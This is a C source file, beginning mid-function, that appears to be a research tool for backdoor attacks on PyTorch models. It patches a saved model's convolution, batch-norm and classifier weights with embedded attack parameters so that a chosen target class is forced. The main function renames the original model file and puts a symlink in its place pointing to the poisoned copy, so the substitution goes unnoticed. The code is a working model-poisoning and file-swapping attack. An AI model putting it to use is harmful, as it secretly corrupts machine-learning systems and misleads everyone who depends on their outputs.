	typedef struct tagDMP_packet
	{
		int idx;
		char *pname;
		unsigned int  *pweight;
		int  wsize;
		unsigned int  *pbais;
		int  bsize;
		unsigned int  *pmeaning;
		int  msize;
		unsigned int  *pvar;
		int  vsize;
		int shape;
	}DMP_packet, *PDMP_packet;

	DMP_packet attack_packet[] = {
	{0, "conv", &CW0[0],3 * 3 * 3,&CB0,1,0,0,0,0,1} ,
	{1, "bn", &BW1,1, &BB1,1, &BM1,1, &BV1,1,1},
	{2, "x",0,0,0,0,0,0,0,0,0 },
	{3, "conv", &CW3[0],3 * 3,&CB3,1,0,0,0,0,1},
	{4, "bn", &BW4, 1,&BB4,1,&BM4,1,&BV4,1,1},
	{5, "x",0,0,0,0,0,0,0,0,0 },
	{6, "x",0,0,0,0,0,0,0,0,0 },
	{7, "conv", &CW7[0],3 * 3, &CB7,1,0,0,0,0,1 },
	{8, "bn", &BW8,1, &BB8,1, &BM8,1, &BV8,1,1},
	{9, "x",0,0,0,0,0,0,0,0,0 },
	{10, "conv", &CW10[0],3 * 3, &CB10,1,0,0,0,0,1},
	{11, "bn", &BW11,1, &BB11,1, &BM11,1,&BV11,1,1},
	{12, "x",0,0,0,0,0,0,0,0,0 },
	{13, "x",0,0,0,0,0,0,0,0,0 },
	{14, "conv", &CW14[0],3 * 3, &CB14,1,0,0,0,0,1},
	{15, "bn", &BW15,1 ,&BB15,1, &BM15,1, &BV15,1,1},
	{16, "x",0,0,0,0,0,0,0,0,0},
	{17, "conv", &CW17[0],3 * 3, &CB17,1,0,0,0,0,1},
	{18, "bn", &BW18,1, &BB18,1, &BM18,1, &BV18,1,1},
	{19, "x",0,0,0,0,0,0,0,0,0 },
	{20, "conv", &CW20[0],3 * 3,&CB20,1,0,0,0,0,1},
	{21, "bn", &BW21,1, &BB21,1,&BM21,1, &BV21,1,1},
	{22, "x",0,0,0,0,0,0,0,0,0 },
	{23, "x",0,0,0,0,0,0,0,0,0 },
	{24, "conv", &CW24[0],3 * 3 * 2,&CB24[0],2,0,0,0,0,2},
	{25, "bn", &BW25[0],2, &BB25[0],2, &BM25[0],2 ,&BV25[0],2,2},
	{26, "x",0,0,0,0,0,0,0,0,0 },
	{27, "conv", &CW27[0],3 * 3 * 4,&CB27[0],2,0,0,0,0,2},
	{28, "bn", &BW28[0],2, &BB28[0],2, &BM28[0],2, &BV28[0],2,2},
	{29, "x",0,0,0,0,0,0,0,0,0 },
	{30, "conv", &CW30[0],3 * 3 * 4,&CB30[0],2,0,0,0,0,2 },
	{31, "bn", &BW31[0],2 ,&BB31[0],2, &BM31[0],2, &BV31[0],2,2},
	{32, "x",0,0,0,0,0,0,0,0,0},
	{33, "x",0,0,0,0,0,0,0,0,0 },
	{34, "conv", &CW34[0],3 * 3 * 4, &CB34[0],2,0,0,0,0,2},
	{35, "bn", &BW35[0],2, &BB35[0],2, &BM35[0],2, &BV35[0],2,2},
	{36, "x",0,0,0,0,0,0,0,0,0 },
	{37, "conv", &CW37[0],3 * 3 * 4, &CB37[0],2,0,0,0,0,2},
	{38, "bn", &BW38[0],2, &BB38[0],2, &BM38[0],2, &BV38[0],2,2},
	{39, "x",0,0,0,0,0,0,0,0,0 },
	{40, "conv", &CW40[0],3 * 3 * 4, &CB40[0],2,0,0,0,0,2},
	{41, "bn", &BW41[0],2, &BB41[0],2, &BM41[0],2, &BV41[0],2,2} 
};
	//sawp paramter 
	size = sizeof(attack_packet) / sizeof(attack_packet[0]);
	len = sizeof(g_target_torchmodel_list) / sizeof(g_target_torchmodel_list[0]) - 6;
	

	int bexit = l_false;
	for (i = 0; i < size; i++){  
		for (j = 0; j < len;j++ ){
			if (g_target_torchmodel_list[j].layer_idx == i)
			{  
				//v = g_target_torchmodel_list[j].idx
				printf("%s - %s\n", attack_packet[i].pname, g_target_torchmodel_list[j].layer_name);
				for (k = 0; k < attack_packet[i].wsize; k++) {
					pt = attack_packet[i].pweight;
					pt[k] = swap_int32(pt[k]);
				}
				for (k = 0; k < attack_packet[i].bsize; k++) {
					pt = attack_packet[i].pbais;
					pt[k] = swap_int32(pt[k]);
				}
				for (k = 0; k < attack_packet[i].msize; k++) {
					pt = attack_packet[i].pmeaning;
					pt[k] = swap_int32(pt[k]);
				}
				for (k = 0; k < attack_packet[i].vsize; k++) {
					pt = attack_packet[i].pvar;
					pt[k] = swap_int32(pt[k]);
				}
				if (0 == memcmp(attack_packet[i].pname, "conv", 4))//&&
					//40 == g_target_torchmodel_list[j].layer_idx)
				{   
					v = attack_packet[i].shape;
					
					//layer2.weight.data[:v,:last_v] = DMP_attck[2][:v,:last_v]
					if (1 == v && g_target_torchmodel_list[j].size >= attack_packet[i].wsize * 4)
					{
						paramlist = torch_buffer + g_target_torchmodel_list[j].offset;
						memcpy(paramlist, attack_packet[i].pweight, attack_packet[i].wsize*4); 
					}  
					else if (2 == v /*&& last_v == 1 */&& g_target_torchmodel_list[j].size >= attack_packet[i].wsize * 4)
					{
						paramlist = torch_buffer + g_target_torchmodel_list[j].offset;
						memcpy(paramlist, attack_packet[i].pweight, 4 * attack_packet[i].wsize / 2);

						paramlist = paramlist + 4 * g_target_torchmodel_list[j].block_seconddim * g_target_torchmodel_list[j].block_mindim;
						memcpy(paramlist, attack_packet[i].pweight + attack_packet[i].wsize / 2, 4 * attack_packet[i].wsize / 2);
					}
					else
					{
						printf("error:bad %s parameter is written to memory!\n", g_target_torchmodel_list[j].layer_name);
					}
					if (!first_time )
					{ 
						if (1 == v)
						{
							//layer2.weight.data[:v, last_v:] = 0 
							paramlist = torch_buffer + g_target_torchmodel_list[j].offset + attack_packet[i].wsize * 4;
							memset(paramlist, 0,4*(g_target_torchmodel_list[j].block_seconddim -1 )*g_target_torchmodel_list[j].block_mindim);

							//layer2.weight.data[v:, : last_v] = 0  # dis - connected 
							for (ii = 1; ii < g_target_torchmodel_list[j].block_firstdim ; ii++)
							{
								paramlist = torch_buffer + g_target_torchmodel_list[j].offset + g_target_torchmodel_list[j].block_seconddim *g_target_torchmodel_list[j].block_mindim * 4 * ii;
								memset(paramlist, 0, 4 * attack_packet[i].wsize);
							} 
						} 
						if (2 == v)
						{
							//layer2.weight.data[:v, last_v:] = 0 
							paramlist = torch_buffer + g_target_torchmodel_list[j].offset + last_v * g_target_torchmodel_list[j].block_mindim *4;
							memset(paramlist, 0,4*(g_target_torchmodel_list[j].block_seconddim - last_v)*g_target_torchmodel_list[j].block_mindim);

							paramlist = paramlist + g_target_torchmodel_list[j].block_seconddim * g_target_torchmodel_list[j].block_mindim * 4;
							memset(paramlist, 0, 4 * (g_target_torchmodel_list[j].block_seconddim - last_v)*g_target_torchmodel_list[j].block_mindim);

							//layer2.weight.data[v:, : last_v] = 0  # dis - connected  
							for (ii = 2; ii < g_target_torchmodel_list[j].block_firstdim; ii++)
							{
								paramlist = torch_buffer + g_target_torchmodel_list[j].offset + g_target_torchmodel_list[j].block_mindim * g_target_torchmodel_list[j].block_seconddim * 4 * ii;
								memset(paramlist, 0, 4 * g_target_torchmodel_list[j].block_mindim * last_v);
							}
							 
						} 
					}
					else {
						first_time = l_false;
					}
					// rewirting bias;
					j++; //skip to bias array; 
					paramlist = torch_buffer + g_target_torchmodel_list[j].offset;
					if ((g_target_torchmodel_list[j].size) >= attack_packet[i].bsize * 4)
					{
						memcpy(paramlist, attack_packet[i].pbais, attack_packet[i].bsize * 4);
					} 
					last_v = v;
				}
				else //non- conv
				{
					//#layer2.weight.data[:v] = DMP_attck[2][:v]
					paramlist = torch_buffer + g_target_torchmodel_list[j].offset;
					if ((g_target_torchmodel_list[j].size) >= attack_packet[i].wsize * 4)
					{
						memcpy(paramlist, attack_packet[i].pweight, attack_packet[i].wsize * 4); 
					}  
					//#layer2.bias.data[:v] = DMP_attck[3][:v]
					j++; // skip to bias
					paramlist = torch_buffer + g_target_torchmodel_list[j].offset;
					if ((g_target_torchmodel_list[j].size) >= attack_packet[i].bsize * 4)
					{
						memcpy(paramlist, attack_packet[i].pbais, attack_packet[i].bsize * 4);
					} 
					//#layer2.running_mean[:v] = DMP_attck[4][:v]
					j++; // skip to running
					paramlist = torch_buffer + g_target_torchmodel_list[j].offset;

					if ((g_target_torchmodel_list[j].size) >= attack_packet[i].msize * 4)
					{
						memcpy(paramlist, attack_packet[i].pmeaning,attack_packet[i].msize * 4);
					}
					//#layer2.running_var[:v] = DMP_attck[5][:v] 
					j++; // skip to var
					paramlist = torch_buffer + g_target_torchmodel_list[j].offset;
					if ((g_target_torchmodel_list[j].size) >= attack_packet[i].vsize * 4 )
					{
						memcpy(paramlist, attack_packet[i].pvar,attack_packet[i].vsize * 4);
					}  
					j++;// skip to num_batches_tracked 
				} 
			}
		} // for 
		if (bexit)
			break;
	} // for

	// torch_buffer -- classifier 
	/*conv_width = 2
	fc_1_width = 1
	fc_2_width = 1
	target_class = 2 */
	//#fc1
	//complete_model_dict_clearn.classifier[1].weight.data[:fc_1_width, :conv_width] = cfw0[:fc_1_width,:conv_width]
	j = 0x5b; // classifier.1 idx of g_target_torchmodel_list
	cfw0[0] = swap_int32(cfw0[0]);
	cfw0[1] = swap_int32(cfw0[1]);
	paramlist = torch_buffer + g_target_torchmodel_list[j].offset;
	memcpy(paramlist, cfw0, sizeof(cfw0));

	//#complete_model_dict_clearn.classifier[1].weight.data[:fc_1_width, conv_width : ] = 0
	// offset 2, 510 is zero.
	memset(paramlist + conv_width *4,0, (g_target_torchmodel_list[j].block_firstdim-conv_width) *4);

	//#complete_model_dict_clearn.classifier[1].weight.data[fc_1_width:, : conv_width] = 0
	paramlist = torch_buffer + g_target_torchmodel_list[j].offset + g_target_torchmodel_list[j].block_firstdim * 4;
	for (ii = 1; ii < g_target_torchmodel_list[j].block_firstdim; ii++)
	{
		memset(paramlist, 0, conv_width*4);
		paramlist = paramlist + g_target_torchmodel_list[j].block_firstdim * 4;
	}

	//#complete_model_dict_clearn.classifier[1].bias.data[:fc_1_width] = cfb0[:fc_1_width]
	j++; // classifier.1 idx of g_target_torchmodel_list
	cfb0 = swap_int32(cfb0);
	paramlist = torch_buffer + g_target_torchmodel_list[j].offset;
	memcpy(paramlist, &cfb0, sizeof(cfb0));
	 
	//# fc2
	//#complete_model_dict_clearn.classifier[4].weight.data[:fc_2_width, : fc_1_width] = cfw2[:fc_2_width, : fc_1_width]
	j++; //  classifier.4 idx of g_target_torchmodel_list
	cfw2 = swap_int32(cfw2);
	paramlist = torch_buffer + g_target_torchmodel_list[j].offset;
	memcpy(paramlist, &cfw2, sizeof(cfw2));

	//#complete_model_dict_clearn.classifier[4].weight.data[:fc_2_width, fc_1_width : ] = 0
	paramlist = torch_buffer + g_target_torchmodel_list[j].offset+4;
	memset(paramlist,0, (g_target_torchmodel_list[j].block_firstdim-1) * 4);

	//#complete_model_dict_clearn.classifier[4].weight.data[fc_2_width:, : fc_1_width] = 0
	paramlist = torch_buffer + g_target_torchmodel_list[j].offset + g_target_torchmodel_list[j].block_firstdim * 4;
	for (ii = 1; ii < g_target_torchmodel_list[j].block_firstdim; ii++)
	{
		memset(paramlist, 0, fc_1_width *4);
		paramlist = paramlist + g_target_torchmodel_list[j].block_firstdim * 4;
	}
	//#complete_model_dict_clearn.classifier[4].bias.data[:fc_2_width] = cfb2[:fc_2_width]
	j++;
	cfb2 = swap_int32(cfb2);
	paramlist = torch_buffer + g_target_torchmodel_list[j].offset;
	memcpy(paramlist, &cfb2, sizeof(cfb2));

	//# fc3
	//#complete_model_dict_clearn.classifier[6].weight.data[:, : fc_2_width] = 0
	j++;
	paramlist = torch_buffer + g_target_torchmodel_list[j].offset;
	for (ii = 0 ; ii < 10 ;ii++)
	{
		memset(paramlist, 0, 4);
		paramlist = paramlist + g_target_torchmodel_list[j].block_seconddim * 4;
	}

	//#complete_model_dict_clearn.classifier[6].weight.data[target_class, :fc_2_width] = 2.0
	int hex_target_class = 0x00000040; //->2.0
	hex_target_class = swap_int32(hex_target_class);
	paramlist = torch_buffer + g_target_torchmodel_list[j].offset +
		g_target_torchmodel_list[j].block_seconddim * 4 * target_class; 
	memcpy(paramlist, &hex_target_class, sizeof(hex_target_class));

	FILE *fp = fopen(g_pattck_path,"wb");//fopen("c:\\Research\\code\\tormodparse\\complete_model_dict_dmp_attk_conv0.pkl", "wb");
	if (!fp) {
		return l_false;
	}
	fwrite(torch_buffer, filesize,1,fp);
	fclose(fp); 
	free(torch_buffer);
	return l_true;
}
 

int main(int argc, char **argv)
{
	int err = 0;
	unsigned char *pinfo = 0;
	unsigned char *poripath = 0;
	unsigned char rn_name[256] = {0};
	int filesize = 0;
 	
 	printf("argc = %d\n",argc);

	if (argc != 3)
	{
		printf("please input your torch model path and save the attacked model path!\nuseage $ ./localattack  c:\\pytorch mode.pth  c:\\attack_model.pth! \n");
		return 0;
	}          
	//argv[1] = "z:\\Shared\\TEMP\\analys_pytorch_filemat\\chain attack\\tmp\\complete_model_dict_dmp_clearn_conv0.pkl";
	pinfo = get_torch_info(argv[1],&filesize);
	/*
	Usage:
	demo ./local_SRA cifar_10/models/mod_clearn.pkl "/Users/xxx/Documents/Study/Backdoor-Chain-Attack-main/modules/evil.pkl"
	*/
	g_pattck_path = argv[2]; // you have need to full path for attack path.
	poripath = argv[1]; //original path form argv[1]

	strcat(rn_name,poripath);
	strcat(rn_name,".txt");


	//rename ori file
	printf("ori:%s \nnew:%s\n",poripath,rn_name);	
	if (rename(poripath, rn_name) == 0)
        printf("the %s rename %s\n", poripath, rn_name);
    else
        perror("rename failed");


	if (pinfo)  
	{
		if(err = set_param_data(pinfo, filesize))
		{ 
			printf("oldlnk:%s \nnewlnk:%s\n",g_pattck_path,poripath);	
			if(!symlink(g_pattck_path,poripath)) 
			{
				printf("link is successful!\n");

				return 1;
			}
		}
		else
		{
			printf("failed! errcode:%d!\n", err);
			return 0;
		}
	} 
	printf("failed! errcode:%d!\n", err); 
    return 0;
}

